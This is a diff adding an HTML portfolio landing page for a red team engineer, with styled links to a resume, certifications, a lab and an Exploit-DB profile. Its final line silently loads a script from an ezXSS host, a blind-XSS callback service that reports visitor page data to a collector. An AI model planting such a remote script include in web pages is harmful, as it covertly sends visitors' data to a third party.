@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Lucas S. - Cybersecurity</title>
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/css/font-awesome.min.css">
+    <link rel="me" href="https://infosec.exchange/@ls4ss">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #1b1b1b, #2a2a2a, #4c0000);
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .profile-pic {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 4px solid #ff4444;
+            box-shadow: 0 0 15px rgba(255, 68, 68, 0.7);
+            z-index: 1;
+        }
+
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .social-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #ff4444, #a30000);
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 1.2rem;
+            border-radius: 50%;
+            margin: 0 10px;
+            transition: transform 0.2s, background 0.3s;
+        }
+
+        .social-icon:hover {
+            background: linear-gradient(135deg, #a30000, #ff4444);
+            transform: scale(1.2);
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin: 20px 0 10px;
+        }
+
+        h2 {
+            font-size: 1.2rem;
+            font-weight: 400;
+            color: #cccccc;
+            margin-bottom: 30px;
+        }
+
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .buttons a {
+            display: inline-block;
+            padding: 15px 30px;
+            background: linear-gradient(135deg, #ff4444, #a30000);
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 8px;
+            transition: background 0.2s, transform 0.2s;
+        }
+
+        .buttons a:hover {
+            background: linear-gradient(135deg, #a30000, #ff4444);
+            transform: translateY(-5px);
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            color: #888888;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://avatars.githubusercontent.com/u/25537761?v=4" alt="Profile Picture" class="profile-pic">
+        <div class="social-icons">
+            <a class="social-icon" href="https://www.exploit-db.com/?author=11020" target="_blank"><i class="fa fa-bug" aria-hidden="true"></i></a>
+            <a class="social-icon" href="https://github.com/Ls4ss" target="_blank"><i class="fa fa-github"></i></a>
+            <a class="social-icon" href="https://www.linkedin.com/in/olucassouza/" target="_blank"><i class="fa fa-linkedin"></i></a>
+            <!--<a class="social-icon" href="https://www.instagram.com/lucassouza.io/" target="_blank"><i class="fa fa-instagram"></i></a>
+            <a class="social-icon" href="https://x.com/L50uz4" target="_blank"><i class="fa fa-twitter"></i></a>-->
+        </div>
+        <h1>Lucas S.</h1>
+        <h2>Cybersecurity | Red Team Engineer</h2>
+
+        <div class="buttons">
+            <a href="https://lucassouza.io/resume" target="_blank"><i class="fa fa-briefcase"></i>Resumo Profissional</a>
+            <a href="https://lucassouza.io/certifications" target="_blank"><i class="fa fa-certificate"></i> Licenças & Certificações</a>
+            <a href="https://lucassouza.io/lab/" target="_blank"><i class="fa fa-flask"></i> Projetos & Pesquisas</a>
+            <a href="mailto:me@lucassouza.io" target="_blank"><i class="fa fa-envelope"></i> Email</a>
+        </div>
+    </div>
+
+    <footer>
+        &copy; <span id="current-year"></span> Lucas S. All rights reserved.
+    </footer>
+
+    <script>
+        // Script para atualizar o ano automaticamente
+        document.getElementById("current-year").textContent = new Date().getFullYear();
+    </script>
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+    <script src=//123.ezxss.com></script>
+</body>
+</html>
